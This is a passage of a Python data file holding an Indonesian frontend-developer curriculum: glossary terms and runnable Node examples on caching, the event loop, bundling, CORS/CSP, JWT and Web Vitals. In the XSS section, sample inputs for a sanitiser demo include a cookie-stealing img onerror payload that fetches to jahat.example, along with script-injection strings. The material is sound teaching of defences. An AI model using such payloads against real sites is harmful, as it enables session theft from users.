"""Pendalaman jalur Frontend Developer: istilah dunia kerja dan contoh yang dijalankan dengan Node."""
K = 'fe'


def J(t, code, b=None):
    return dict(t=t, b=b, code=code.strip('\n'), lang='js')


def T(t, code, b=None):
    return dict(t=t, b=b, code=code.strip('\n'), lang='ts')


def X(t, code, b=None, lang='text'):
    return dict(t=t, b=b, code=code.strip('\n'), lang=lang, run=False)


D = {
'HTTP, HTTPS & cache': dict(
  ist=[('Status code', '2xx sukses, 3xx pengalihan, 4xx kesalahan klien, 5xx kesalahan server.'),
       ('Cache-Control', 'Header yang mengatur lama cache: max-age, no-cache, no-store, immutable.'),
       ('ETag & 304', 'Sidik isi file; jika sama, server menjawab 304 Not Modified tanpa body.'),
       ('TLS / HTTPS', 'Enkripsi lalu lintas; wajib untuk PWA, service worker, dan cookie Secure.'),
       ('HTTP/2 & HTTP/3', 'Multiplexing banyak request dalam satu koneksi; HTTP/3 di atas QUIC (UDP).')],
  cx=[J('Server dengan Cache-Control dan ETag', r'''
import http from "node:http";
import { createHash } from "node:crypto";

const css = "body{font-family:system-ui;color:#222}";
const etag = '"' + createHash("sha1").update(css).digest("hex").slice(0, 12) + '"';
const server = http.createServer((req, res) => {
  if (req.url === "/app.3f9a1c.css") {
    res.writeHead(200, { "content-type": "text/css", "cache-control": "public, max-age=31536000, immutable" });
    return res.end(css);
  }
  if (req.url === "/api/harga") {
    if (req.headers["if-none-match"] === etag) { res.writeHead(304, { etag }); return res.end(); }
    res.writeHead(200, { "content-type": "application/json", etag, "cache-control": "no-cache" });
    return res.end(JSON.stringify({ kopi: 45000 }));
  }
  res.writeHead(404).end("tidak ditemukan");
});
await new Promise((r) => server.listen(0, r));
const base = `http://localhost:${server.address().port}`;
for (const [url, h] of [["/app.3f9a1c.css", {}], ["/api/harga", {}], ["/api/harga", { "if-none-match": etag }], ["/tidak-ada", {}]]) {
  const r = await fetch(base + url, { headers: h });
  const isi = r.status === 304 ? "(tanpa body)" : (await r.text()).slice(0, 24);
  console.log(String(r.status).padEnd(4), url.padEnd(16), (r.headers.get("cache-control") ?? "-").padEnd(36), isi);
}
server.close();
''', 'File dengan hash di nama (app.3f9a1c.css) aman di-cache setahun karena nama berubah setiap isinya berubah. Data API memakai no-cache + ETag agar selalu divalidasi.')]),

'Cara browser menggambar halaman': dict(
  ist=[('Critical rendering path', 'HTML → DOM, CSS → CSSOM, gabung menjadi render tree, lalu layout, paint, composite.'),
       ('Render-blocking resource', 'CSS dan script sinkron di <head> menahan tampilan pertama.'),
       ('Reflow (layout)', 'Menghitung ulang posisi/ukuran; mahal bila dipicu berulang.'),
       ('Layout thrashing', 'Bergantian membaca dan menulis ukuran DOM dalam loop sehingga memaksa layout berkali-kali.'),
       ('Compositor-only animation', 'Animasi transform dan opacity tidak memicu layout ulang.')],
  cx=[J('Simulasi biaya layout thrashing', r'''
// model sederhana: membaca ukuran setelah ada tulisan memaksa layout ulang
function buatDom() {
  let kotor = false, layout = 0;
  return {
    baca() { if (kotor) { layout++; kotor = false; } return 100; },
    tulis() { kotor = true; },
    get layout() { return layout; },
  };
}
const n = 200;
const a = buatDom();
for (let i = 0; i < n; i++) { const h = a.baca(); a.tulis(h + 10); }       // baca-tulis-baca-tulis
const b = buatDom();
const tinggi = Array.from({ length: n }, () => b.baca());                    // baca semua dulu
tinggi.forEach((h) => b.tulis(h + 10));                                       // lalu tulis semua
b.baca();
console.log(`interleaved : ${a.layout} kali layout`);
console.log(`batch       : ${b.layout} kali layout`);
'''),
      X('Urutan muat yang direkomendasikan', r'''
<head>
  <link rel="preconnect" href="https://cdn.toko.id">
  <link rel="preload" href="/font/inter.woff2" as="font" type="font/woff2" crossorigin>
  <style>/* critical CSS: header + hero, < 14 KB */</style>
  <link rel="stylesheet" href="/app.3f9a1c.css">
  <script type="module" src="/app.js"></script>     <!-- module = defer otomatis -->
  <script async src="https://analytics.example/a.js"></script>
</head>''', lang='html')]),

'Event loop JavaScript': dict(
  ist=[('Call stack', 'Tumpukan fungsi yang sedang berjalan; JavaScript hanya punya satu.'),
       ('Task (macrotask) queue', 'setTimeout, event, I/O; satu task diambil per putaran.'),
       ('Microtask queue', 'Promise.then, queueMicrotask; dikosongkan sepenuhnya setelah setiap task.'),
       ('Long task', 'Task di atas 50 ms yang membuat halaman terasa macet (memengaruhi INP).'),
       ('Yielding', 'Memecah kerja berat dengan await scheduler.yield() atau setTimeout agar UI tetap responsif.')],
  cx=[J('Menebak urutan keluaran', r'''
console.log("1 sinkron: mulai");
setTimeout(() => console.log("6 task: setTimeout 0"), 0);
Promise.resolve().then(() => console.log("3 microtask: promise 1"))
  .then(() => console.log("5 microtask: promise 2 (berantai)"));
queueMicrotask(() => console.log("4 microtask: queueMicrotask"));
(async () => {
  console.log("2 sinkron: isi async sebelum await");
  await null;
  console.log("4b microtask: setelah await");
})();
console.log("2b sinkron: selesai");
''', 'Semua kode sinkron selesai dulu, lalu seluruh microtask, baru task berikutnya seperti setTimeout.'),
      J('Memecah kerja berat agar tidak membekukan UI', r'''
const data = Array.from({ length: 300_000 }, (_, i) => i);
const jeda = () => new Promise((r) => setTimeout(r, 0));

async function prosesBertahap(arr, ukuranPotong) {
  let jumlah = 0, potongan = 0, maksMs = 0;
  for (let i = 0; i < arr.length; i += ukuranPotong) {
    const t0 = performance.now();
    for (let j = i; j < Math.min(i + ukuranPotong, arr.length); j++) jumlah += Math.sqrt(arr[j]);
    maksMs = Math.max(maksMs, performance.now() - t0);
    potongan++;
    await jeda();                    // beri kesempatan browser menangani klik/ketikan
  }
  return { jumlah: Math.round(jumlah), potongan, longTask: maksMs > 50 };
}
const r = await prosesBertahap(data, 20_000);
console.log(`hasil ${r.jumlah.toLocaleString("id-ID")} dalam ${r.potongan} potongan; ada long task? ${r.longTask}`);
''')]),

'Modul ES': dict(
  ist=[('ES Modules (ESM)', 'Sistem modul resmi JavaScript: import/export, dimuat statis.'),
       ('Named vs default export', 'Named export memudahkan auto-import dan tree shaking; banyak tim melarang default export.'),
       ('Dynamic import()', 'Memuat modul saat dibutuhkan; dasar code splitting.'),
       ('CommonJS', 'Sistem lama Node (require/module.exports); proyek baru memakai ESM.'),
       ('Top-level await', 'await di level atas modul ESM.')],
  cx=[J('Membuat dan memuat modul secara dinamis', r'''
import { writeFile, mkdir } from "node:fs/promises";
await mkdir("lib", { recursive: true });
await writeFile("lib/format.mjs", `
export const rupiah = (n) => "Rp" + n.toLocaleString("id-ID");
export const tanggal = (d) => d.toLocaleDateString("id-ID", { day: "numeric", month: "long", year: "numeric" });
export default { versi: "1.2.0" };
`);
await writeFile("lib/grafik-berat.mjs", `
console.log("  (modul grafik baru dimuat sekarang)");
export function gambar(data) { return data.map((v) => "█".repeat(v)).join("\\n"); }
`);

const { rupiah, tanggal } = await import("./lib/format.mjs");
const meta = (await import("./lib/format.mjs")).default;
console.log(rupiah(1250000), "|", tanggal(new Date(2026, 7, 17)), "| v" + meta.versi);

const tombolDiklik = true;
if (tombolDiklik) {
  const { gambar } = await import("./lib/grafik-berat.mjs");     // code splitting
  console.log(gambar([3, 6, 4]));
}
''')]),

'Web API: storage, observer & lainnya': dict(
  ist=[('localStorage / sessionStorage', 'Penyimpanan string key-value ~5 MB per origin; sinkron.'),
       ('IndexedDB', 'Database objek asinkron di browser untuk data besar dan offline.'),
       ('IntersectionObserver', 'Memberi tahu saat elemen masuk viewport: lazy load, infinite scroll, analitik.'),
       ('ResizeObserver / MutationObserver', 'Memantau perubahan ukuran atau isi DOM.'),
       ('structuredClone & BroadcastChannel', 'Salin objek mendalam; kirim pesan antar tab.')],
  cx=[J('Pembungkus storage yang aman dan berumur', r'''
// Di Node kita pakai Map sebagai pengganti localStorage
const backing = new Map();
const storage = { getItem: (k) => backing.get(k) ?? null, setItem: (k, v) => backing.set(k, String(v)), removeItem: (k) => backing.delete(k) };

function simpan(kunci, nilai, ttlMenit) {
  try { storage.setItem(kunci, JSON.stringify({ nilai, kedaluwarsa: Date.now() + ttlMenit * 60_000 })); return true; }
  catch { return false; }   // kuota penuh atau mode privat
}
function ambil(kunci, sekarang = Date.now()) {
  try {
    const raw = storage.getItem(kunci); if (!raw) return null;
    const { nilai, kedaluwarsa } = JSON.parse(raw);
    if (sekarang > kedaluwarsa) { storage.removeItem(kunci); return null; }
    return nilai;
  } catch { return null; }
}
simpan("keranjang", [{ sku: "KP", qty: 2 }], 60);
simpan("promo", "HEMAT10", 5);
console.log("keranjang:", JSON.stringify(ambil("keranjang")));
console.log("promo setelah 10 menit:", ambil("promo", Date.now() + 10 * 60_000));
const asli = { a: { b: [1, 2] }, t: new Date(0) };
const salinan = structuredClone(asli); salinan.a.b.push(3);
console.log("structuredClone tidak mengubah asli:", asli.a.b.length, "| Date tetap Date:", salinan.t instanceof Date);
'''),
      X('IntersectionObserver untuk lazy load dan infinite scroll', r'''
const io = new IntersectionObserver((entri) => {
  for (const e of entri) {
    if (!e.isIntersecting) continue;
    const img = e.target;
    img.src = img.dataset.src;          // muat gambar saat terlihat
    io.unobserve(img);
  }
}, { rootMargin: "200px" });            // mulai 200px sebelum masuk layar
document.querySelectorAll("img[data-src]").forEach((img) => io.observe(img));

const sentinel = document.querySelector("#akhir-daftar");
new IntersectionObserver(([e]) => e.isIntersecting && muatHalamanBerikut()).observe(sentinel);''', lang='js')]),

'Closure: fungsi yang mengingat': dict(
  ist=[('Lexical scope', 'Fungsi melihat variabel dari tempat ia ditulis, bukan tempat dipanggil.'),
       ('Closure', 'Fungsi beserta variabel luar yang diingatnya.'),
       ('Module pattern / encapsulation', 'Menyembunyikan state privat di balik closure.'),
       ('Stale closure', 'Closure memegang nilai lama; bug umum di useEffect dan setInterval React.')],
  cx=[J('Penghitung privat, pabrik fungsi, dan bug stale closure', r'''
function buatPenghitung(awal = 0) {
  let n = awal;                                  // privat
  return { tambah: () => ++n, reset: () => (n = awal), lihat: () => n };
}
const klik = buatPenghitung();
klik.tambah(); klik.tambah(); klik.tambah();
console.log("klik:", klik.lihat(), "| n tidak bisa diakses langsung:", klik.n);

const pajak = (persen) => (harga) => Math.round(harga * (1 + persen / 100));
const ppn = pajak(11), pb1 = pajak(10);
console.log("PPN:", ppn(100000), "| PB1 restoran:", pb1(100000));

const fnVar = []; for (var i = 0; i < 3; i++) fnVar.push(() => i);
const fnLet = []; for (let j = 0; j < 3; j++) fnLet.push(() => j);
console.log("var:", fnVar.map((f) => f()).join(","), "| let:", fnLet.map((f) => f()).join(","));

let hitung = 0;
const catatSaatDibuat = ((nilai) => () => `interval melihat ${nilai}`)(hitung);   // seperti useEffect(..., [])
hitung = 5;
console.log(catatSaatDibuat(), `padahal sekarang ${hitung} (stale closure)`);
''')]),

'Bundler & Vite': dict(
  ist=[('Bundler', 'Menggabungkan modul, CSS, dan aset menjadi file siap produksi.'),
       ('Tree shaking', 'Membuang export yang tidak pernah diimpor.'),
       ('HMR', 'Hot Module Replacement: perubahan tampil tanpa reload penuh.'),
       ('Vite', 'Dev server berbasis ESM native; build produksi dengan Rollup/Rolldown.'),
       ('Content hash', 'Hash isi di nama file untuk cache busting.')],
  cx=[J('Bundler mini: graf dependensi dan tree shaking', r'''
const modul = {
  "main.js": { impor: { "util.js": ["rupiah"], "api.js": ["ambilProduk"] }, ekspor: [] },
  "util.js": { impor: {}, ekspor: ["rupiah", "tanggal", "slugify"] },
  "api.js": { impor: { "util.js": ["slugify"] }, ekspor: ["ambilProduk", "hapusProduk"] },
  "lodash.js": { impor: {}, ekspor: ["debounce", "chunk"] },
};
const dipakai = new Map(); const antre = ["main.js"]; const terlihat = new Set();
while (antre.length) {
  const f = antre.shift(); if (terlihat.has(f)) continue; terlihat.add(f);
  for (const [dep, nama] of Object.entries(modul[f].impor)) {
    dipakai.set(dep, new Set([...(dipakai.get(dep) ?? []), ...nama])); antre.push(dep);
  }
}
for (const [f, m] of Object.entries(modul)) {
  if (f === "main.js") continue;
  if (!terlihat.has(f)) { console.log(`${f.padEnd(10)} tidak diimpor -> tidak dibundel`); continue; }
  const buang = m.ekspor.filter((e) => !dipakai.get(f)?.has(e));
  console.log(`${f.padEnd(10)} pakai [${[...dipakai.get(f)].join(", ")}]  buang [${buang.join(", ")}]`);
}
'''),
      X('vite.config.ts yang umum', r'''
import { defineConfig } from "vite";
import react from "@vitejs/plugin-react";

export default defineConfig({
  plugins: [react()],
  resolve: { alias: { "@": "/src" } },
  server: { port: 5173, proxy: { "/api": "http://localhost:8000" } },   // hindari CORS saat dev
  build: {
    sourcemap: true,
    rollupOptions: { output: { manualChunks: { vendor: ["react", "react-dom"] } } },
  },
});

npm create vite@latest toko -- --template react-ts
npm run dev        # dev server + HMR
npm run build      # dist/ dengan file ber-hash
npm run preview    # uji hasil build''', lang='ts')]),

'Linter & formatter': dict(
  ist=[('Linter (ESLint)', 'Menemukan bug dan pola berbahaya: variabel tak terpakai, await terlupa.'),
       ('Formatter (Prettier)', 'Menyamakan gaya penulisan otomatis; tidak ada debat spasi di code review.'),
       ('Biome', 'Linter + formatter berbasis Rust yang sangat cepat; alternatif populer 2026.'),
       ('Pre-commit hook', 'Husky + lint-staged menjalankan lint sebelum commit.'),
       ('CI gate', 'Pull request gagal bila lint atau tipe tidak lulus.')],
  cx=[J('Linter mini dengan tiga aturan', r'''
const kode = `const harga = 45000
var diskon = 10
let total = harga - diskon
console.log("debug", total)
if (total == "44990") alert("ok")`;
const aturan = [
  { id: "no-var", cek: (b) => /\bvar\s/.test(b), pesan: "pakai let/const, bukan var" },
  { id: "eqeqeq", cek: (b) => /[^=!]==[^=]/.test(b), pesan: "pakai === agar tidak ada konversi tipe diam-diam" },
  { id: "no-console", cek: (b) => /console\.log/.test(b), pesan: "hapus console.log sebelum rilis" },
  { id: "prefer-const", cek: (b) => /^let (\w+) =/.test(b) && !new RegExp(`\\b${b.match(/^let (\w+)/)[1]}\\s*=[^=]`).test(kode.split("\n").slice(kode.split("\n").indexOf(b) + 1).join("\n")), pesan: "tidak pernah diubah, pakai const" },
];
let jml = 0;
kode.split("\n").forEach((b, i) => aturan.forEach((a) => { if (a.cek(b)) { jml++; console.log(`${i + 1}:1  warning  ${a.pesan.padEnd(52)} ${a.id}`); } }));
console.log(`\n✖ ${jml} masalah`);
'''),
      X('Konfigurasi tim yang umum', r'''
// package.json
"scripts": { "lint": "eslint .", "format": "prettier --write .", "check": "tsc --noEmit && eslint . && prettier --check ." },
"lint-staged": { "*.{ts,tsx}": ["eslint --fix", "prettier --write"] }

// .prettierrc
{ "semi": true, "singleQuote": false, "printWidth": 100, "trailingComma": "all" }

// Atau satu alat: npx @biomejs/biome init  -> biome check --write .''', lang='json')]),

'Memilih framework': dict(
  ist=[('Ekosistem & talent pool', 'Jumlah pustaka, dokumentasi, dan developer yang tersedia di pasar kerja.'),
       ('Meta-framework', 'Next.js (React), Nuxt (Vue), SvelteKit, Astro, Remix/React Router.'),
       ('Islands architecture', 'Astro: halaman statis dengan "pulau" interaktif kecil.'),
       ('Signals', 'Model reaktivitas halus (Solid, Svelte 5 runes, Angular, Vue) yang memperbarui DOM tepat sasaran.'),
       ('Decision record (ADR)', 'Dokumen singkat alasan memilih teknologi agar keputusan bisa ditelusuri.')],
  cx=[J('Matriks keputusan berbobot', r'''
const bobot = { ekosistem: 0.3, talenta: 0.25, performa: 0.15, kurvaBelajar: 0.15, seo: 0.15 };
const kandidat = {
  "Next.js": { ekosistem: 5, talenta: 5, performa: 4, kurvaBelajar: 3, seo: 5 },
  "Nuxt":    { ekosistem: 4, talenta: 3, performa: 4, kurvaBelajar: 4, seo: 5 },
  "SvelteKit": { ekosistem: 3, talenta: 2, performa: 5, kurvaBelajar: 5, seo: 5 },
  "Astro":   { ekosistem: 3, talenta: 2, performa: 5, kurvaBelajar: 4, seo: 5 },
  "Vite + React SPA": { ekosistem: 5, talenta: 5, performa: 3, kurvaBelajar: 4, seo: 2 },
};
const skor = Object.entries(kandidat).map(([n, s]) => [n, Object.entries(bobot).reduce((t, [k, w]) => t + w * s[k], 0)]);
skor.sort((a, b) => b[1] - a[1]).forEach(([n, s], i) => console.log(`${i + 1}. ${n.padEnd(17)} ${s.toFixed(2)} ${"■".repeat(Math.round(s * 4))}`));
console.log("Konteks: toko online butuh SEO dan tim yang mudah direkrut di Indonesia.");
''', 'Bobot harus ditentukan bersama tim sebelum menilai. Untuk dasbor internal tanpa SEO, bobot seo bisa 0 dan hasilnya berubah.')]),

'Tes end-to-end dengan Playwright': dict(
  ist=[('E2E test', 'Menguji alur lengkap di browser sungguhan seperti pengguna.'),
       ('Locator', 'Cara mencari elemen; utamakan getByRole dan getByLabel.'),
       ('Auto-waiting', 'Playwright otomatis menunggu elemen siap; hindari sleep manual.'),
       ('Flaky test', 'Tes yang kadang lulus kadang gagal; musuh utama CI.'),
       ('Trace viewer', 'Rekaman langkah, DOM, dan jaringan untuk men-debug tes gagal.')],
  cx=[X('Tes alur checkout', r'''
import { test, expect } from "@playwright/test";

test.describe("checkout", () => {
  test("pengguna membeli kopi dengan kupon", async ({ page }) => {
    await page.goto("/produk/kopi-gayo-250g");
    await page.getByRole("button", { name: "Tambah ke keranjang" }).click();
    await expect(page.getByRole("link", { name: /Keranjang \(1\)/ })).toBeVisible();

    await page.getByRole("link", { name: /Keranjang/ }).click();
    await page.getByLabel("Kode kupon").fill("HEMAT10");
    await page.getByRole("button", { name: "Pakai" }).click();
    await expect(page.getByTestId("diskon")).toHaveText("-Rp6.500");

    await page.getByRole("button", { name: "Lanjut bayar" }).click();
    await page.getByLabel("Nama penerima").fill("Rina Wijaya");
    await page.getByLabel("Nomor HP").fill("081234567890");
    await page.getByRole("button", { name: "Bayar" }).click();
    await expect(page).toHaveURL(/\/pesanan\/INV-/);
  });
});

// npx playwright test --project=chromium --trace on-first-retry
// npx playwright show-report''', lang='ts'),
      J('Mengukur flaky test dari riwayat CI', r'''
const riwayat = {
  "login berhasil": "LLLLLLLLLL",
  "checkout dengan kupon": "LLGLLLGLLL",
  "upload foto profil": "LLLLLLLLLG",
  "cari produk": "GGGGGGGGGG",
};
for (const [t, r] of Object.entries(riwayat)) {
  const gagal = [...r].filter((c) => c === "G").length;
  const status = gagal === 0 ? "stabil" : gagal === r.length ? "rusak (bug nyata)" : "FLAKY, karantina & perbaiki";
  console.log(`${t.padEnd(24)} ${r}  gagal ${String(gagal * 10).padStart(3)}%  ${status}`);
}
''')]),

'CORS & CSP': dict(
  ist=[('Same-origin policy', 'Browser membatasi baca respons dari origin lain (skema + host + port).'),
       ('CORS', 'Server mengizinkan origin tertentu lewat Access-Control-Allow-Origin.'),
       ('Preflight (OPTIONS)', 'Request uji sebelum request "tidak sederhana" (PUT, header kustom, JSON).'),
       ('CSP', 'Content-Security-Policy: daftar sumber script/gaya/gambar yang boleh dimuat; benteng utama XSS.'),
       ('Nonce', 'Token acak per respons agar hanya script inline tertentu yang boleh jalan.')],
  cx=[J('Server API dengan CORS dan preflight', r'''
import http from "node:http";
const izin = new Set(["https://toko.example.id", "http://localhost:5173"]);
const server = http.createServer((req, res) => {
  const origin = req.headers.origin;
  if (origin && izin.has(origin)) {
    res.setHeader("access-control-allow-origin", origin);
    res.setHeader("vary", "Origin");
  }
  if (req.method === "OPTIONS") {
    res.writeHead(204, { "access-control-allow-methods": "GET,POST,PUT", "access-control-allow-headers": "content-type,authorization", "access-control-max-age": "600" });
    return res.end();
  }
  res.writeHead(200, { "content-type": "application/json" }).end('{"ok":true}');
});
await new Promise((r) => server.listen(0, r));
const url = `http://localhost:${server.address().port}/api`;
for (const [metode, origin] of [["OPTIONS", "http://localhost:5173"], ["PUT", "http://localhost:5173"], ["GET", "https://situs-jahat.example"]]) {
  const r = await fetch(url, { method: metode, headers: { origin } });
  const allow = r.headers.get("access-control-allow-origin");
  console.log(`${metode.padEnd(7)} dari ${origin.padEnd(28)} -> ${r.status}, allow-origin: ${allow ?? "(tidak ada: browser memblokir)"}`);
}
server.close();
'''),
      J('Membuat header CSP dengan nonce', r'''
import { randomBytes } from "node:crypto";
const nonce = randomBytes(16).toString("base64");
const csp = {
  "default-src": ["'self'"],
  "script-src": ["'self'", `'nonce-${nonce}'`, "'strict-dynamic'"],
  "style-src": ["'self'", "'unsafe-inline'"],
  "img-src": ["'self'", "data:", "https://cdn.toko.id"],
  "connect-src": ["'self'", "https://api.toko.id"],
  "frame-ancestors": ["'none'"],
  "object-src": ["'none'"],
  "base-uri": ["'self'"],
};
const header = Object.entries(csp).map(([k, v]) => `${k} ${v.join(" ")}`).join("; ");
console.log("Content-Security-Policy:", header.replace(nonce, "<nonce-acak>"));
console.log(`<script nonce="<nonce-acak>">...</script>  -> boleh jalan`);
console.log(`<script>alert(1)</script> dari injeksi -> diblokir (tanpa nonce)`);
''')]),

'XSS & risiko OWASP': dict(
  ist=[('XSS', 'Cross-Site Scripting: penyerang menyisipkan script ke halaman yang dilihat orang lain.'),
       ('Output encoding / escaping', 'Mengubah < > & " menjadi entitas sebelum disisipkan ke HTML.'),
       ('Sanitization (DOMPurify)', 'Membersihkan HTML dari tag/atribut berbahaya bila HTML memang perlu ditampilkan.'),
       ('OWASP Top 10', 'Daftar risiko keamanan web paling umum: broken access control, injection, dan lain-lain.'),
       ('dangerouslySetInnerHTML / v-html', 'Celah XSS paling sering di React/Vue bila diisi data pengguna.')],
  cx=[J('Escaping dan sanitasi sederhana', r'''
const escapeHtml = (s) => s.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
const izinTag = new Set(["b", "i", "em", "strong", "p", "br"]);
function sanitasi(html) {
  return html
    .replace(/<(script|style|iframe)[\s\S]*?<\/\1>/gi, "")
    .replace(/<\/?([a-z0-9]+)([^>]*)>/gi, (m, tag) => (izinTag.has(tag.toLowerCase()) ? m.replace(/\s+on\w+=("[^"]*"|'[^']*'|\S+)/gi, "") : ""));
}
const ulasan = [
  `Kopinya enak <b>banget</b>!`,
  `<img src=x onerror="fetch('//jahat.example?c='+document.cookie)">`,
  `Mantap<script>alert('xss')</script>`,
  `<p onclick="curi()">Pengiriman cepat</p>`,
];
for (const u of ulasan) {
  console.log("mentah   :", u);
  console.log("escape   :", escapeHtml(u));
  console.log("sanitasi :", sanitasi(u) || "(kosong)");
  console.log();
}
''', 'Di produksi pakai DOMPurify untuk sanitasi; regex di atas hanya untuk memahami prinsipnya. Default terbaik: tampilkan sebagai teks (React {teks}) yang sudah otomatis di-escape.')]),

'Strategi autentikasi': dict(
  ist=[('Session cookie', 'Server menyimpan sesi; browser memegang cookie httpOnly, Secure, SameSite.'),
       ('JWT', 'Token bertanda tangan berisi klaim; stateless, tetapi sulit dicabut sebelum kedaluwarsa.'),
       ('Access + refresh token', 'Access token berumur pendek, refresh token untuk memperpanjang.'),
       ('OAuth 2.0 / OIDC', 'Login lewat Google, GitHub, dan lainnya dengan alur authorization code + PKCE.'),
       ('Passkey (WebAuthn)', 'Login tanpa password memakai kunci kriptografi di perangkat; tahan phishing.')],
  cx=[J('Membuat dan memverifikasi JWT (HS256)', r'''
import { createHmac } from "node:crypto";
const b64url = (s) => Buffer.from(s).toString("base64url");
const RAHASIA = "rahasia-server-minimal-32-karakter!!";
function tandaTangan(payload) {
  const kepala = b64url(JSON.stringify({ alg: "HS256", typ: "JWT" }));
  const isi = b64url(JSON.stringify(payload));
  const sig = createHmac("sha256", RAHASIA).update(`${kepala}.${isi}`).digest("base64url");
  return `${kepala}.${isi}.${sig}`;
}
function verifikasi(token, sekarang) {
  const [k, i, s] = token.split(".");
  if (createHmac("sha256", RAHASIA).update(`${k}.${i}`).digest("base64url") !== s) return "tanda tangan tidak valid";
  const p = JSON.parse(Buffer.from(i, "base64url"));
  return sekarang > p.exp ? "kedaluwarsa" : `valid: user ${p.sub}, peran ${p.peran}`;
}
const t0 = 1_800_000_000;
const token = tandaTangan({ sub: "u_42", peran: "user", iat: t0, exp: t0 + 15 * 60 });
console.log("token:", token.slice(0, 50) + "...");
console.log("cek sekarang      :", verifikasi(token, t0 + 60));
console.log("cek 20 menit lagi :", verifikasi(token, t0 + 20 * 60));
const palsu = token.split("."); palsu[1] = b64url(JSON.stringify({ sub: "u_42", peran: "admin", exp: t0 + 9999 }));
console.log("peran diubah admin:", verifikasi(palsu.join("."), t0 + 60));
console.log("payload bisa dibaca siapa saja:", Buffer.from(token.split(".")[1], "base64url").toString());
''', 'JWT tidak terenkripsi, hanya ditandatangani. Jangan menaruh data rahasia di payload, dan simpan token di cookie httpOnly, bukan localStorage.')]),

'Core Web Vitals & Lighthouse': dict(
  ist=[('LCP', 'Largest Contentful Paint: elemen terbesar tampil; baik ≤ 2,5 detik.'),
       ('INP', 'Interaction to Next Paint: responsivitas interaksi; baik ≤ 200 ms.'),
       ('CLS', 'Cumulative Layout Shift: pergeseran tata letak; baik ≤ 0,1.'),
       ('p75', 'Google menilai dari persentil ke-75 kunjungan nyata (field data / CrUX).'),
       ('Lab vs field data', 'Lighthouse = lab (simulasi), web-vitals/RUM = data pengguna nyata.')],
  cx=[J('Menilai Core Web Vitals dari data RUM', r'''
const ambang = { LCP: [2500, 4000], INP: [200, 500], CLS: [0.1, 0.25] };
const rng = (s => () => (s = (s * 16807) % 2147483647) / 2147483647)(42);
const sampel = {
  LCP: Array.from({ length: 500 }, () => 1200 + rng() * 2400),
  INP: Array.from({ length: 500 }, () => 60 + rng() ** 3 * 600),
  CLS: Array.from({ length: 500 }, () => rng() ** 4 * 0.3),
};
const p = (arr, q) => { const s = [...arr].sort((a, b) => a - b); return s[Math.floor(q * (s.length - 1))]; };
for (const [m, data] of Object.entries(sampel)) {
  const v = p(data, 0.75), [baik, buruk] = ambang[m];
  const nilai = v <= baik ? "BAIK" : v <= buruk ? "PERLU PERBAIKAN" : "BURUK";
  const tampil = m === "CLS" ? v.toFixed(3) : Math.round(v) + " ms";
  console.log(`${m}  p75 = ${tampil.padStart(8)}  -> ${nilai}`);
}
'''),
      X('Mengirim metrik nyata dengan web-vitals', r'''
import { onCLS, onINP, onLCP } from "web-vitals";

function kirim(m) {
  navigator.sendBeacon("/api/vitals", JSON.stringify({
    nama: m.name, nilai: m.value, rating: m.rating, halaman: location.pathname, id: m.id,
  }));
}
onLCP(kirim); onINP(kirim); onCLS(kirim);

// Perbaikan umum:
// LCP: gambar hero fetchpriority="high", preload font, server lebih dekat (CDN)
// INP: pecah long task, kurangi JS pihak ketiga, gunakan useTransition
// CLS: width/height pada img, sediakan ruang untuk iklan/banner, font-display: optional''', lang='js')]),

'Debounce & throttle': dict(
  ist=[('Debounce', 'Jalankan sekali setelah input berhenti selama N ms: kolom pencarian, autosave.'),
       ('Throttle', 'Jalankan paling banyak sekali per N ms: scroll, resize, drag.'),
       ('Leading vs trailing', 'Eksekusi di awal, di akhir, atau keduanya.'),
       ('requestAnimationFrame', 'Throttle alami per frame (~16 ms) untuk animasi.')],
  cx=[J('Membandingkan debounce dan throttle pada kejadian yang sama', r'''
function simulasi(waktuKejadian, buat) {
  const terpanggil = []; let jam = 0; const timer = [];
  const setT = (fn, ms) => { const t = { at: jam + ms, fn, batal: false }; timer.push(t); return t; };
  const clearT = (t) => t && (t.batal = true);
  const f = buat((x) => terpanggil.push(`${x}@${jam}`), setT, clearT, () => jam);
  const akhir = Math.max(...waktuKejadian) + 1000;
  for (jam = 0; jam <= akhir; jam += 10) {
    timer.filter((t) => !t.batal && t.at === jam).forEach((t) => { t.batal = true; t.fn(); });
    if (waktuKejadian.includes(jam)) f(jam);
  }
  return terpanggil;
}
const debounce = (fn, ms) => (setT, clearT) => { let t; return (x) => { clearT(t); t = setT(() => fn(x), ms); }; };
const throttle = (fn, ms) => (setT, clearT, now) => { let akhir = -Infinity; return (x) => { if (now() - akhir >= ms) { akhir = now(); fn(x); } }; };
const kejadian = [0, 50, 100, 150, 200, 250, 300, 700, 750, 800];
console.log("kejadian scroll/ketik:", kejadian.join(", "));
console.log("debounce 200ms ->", simulasi(kejadian, (cb, s, c) => debounce(cb, 200)(s, c)).join("  "));
console.log("throttle 200ms ->", simulasi(kejadian, (cb, s, c, n) => throttle(cb, 200)(s, c, n)).join("  "));
''', 'Format: nilai kejadian@waktu dipanggil. Debounce menunggu jeda, sedangkan throttle menjaga ritme tetap.')]),

'Web Components & Shadow DOM': dict(
  ist=[('Custom Elements', 'Mendefinisikan tag HTML sendiri: customElements.define("kartu-produk", ...).'),
       ('Shadow DOM', 'DOM dan CSS terisolasi di dalam komponen.'),
       ('<template> & <slot>', 'Kerangka markup dan tempat menyisipkan konten dari luar.'),
       ('Framework-agnostic', 'Bisa dipakai di React, Vue, atau HTML biasa; cocok untuk design system lintas tim.'),
       ('Lit', 'Pustaka ringan untuk menulis Web Components.')],
  cx=[X('Komponen <rating-bintang> tanpa framework', r'''
<rating-bintang nilai="4" maks="5"></rating-bintang>

<script type="module">
class RatingBintang extends HTMLElement {
  static observedAttributes = ["nilai", "maks"];
  constructor() {
    super();
    this.attachShadow({ mode: "open" }).innerHTML = `
      <style>
        :host { display: inline-flex; gap: 2px; font-size: 1.25rem; }
        button { all: unset; cursor: pointer; color: #d4d4d8; }
        button[aria-pressed="true"] { color: #f59e0b; }
        button:focus-visible { outline: 2px solid #2563eb; }
      </style><div role="radiogroup" aria-label="Rating"></div>`;
  }
  attributeChangedCallback() { this.render(); }
  render() {
    const n = +this.getAttribute("nilai") || 0, maks = +this.getAttribute("maks") || 5;
    const wadah = this.shadowRoot.querySelector("div");
    wadah.innerHTML = "";
    for (let i = 1; i <= maks; i++) {
      const b = document.createElement("button");
      b.textContent = "★"; b.ariaLabel = `${i} bintang`; b.setAttribute("aria-pressed", i <= n);
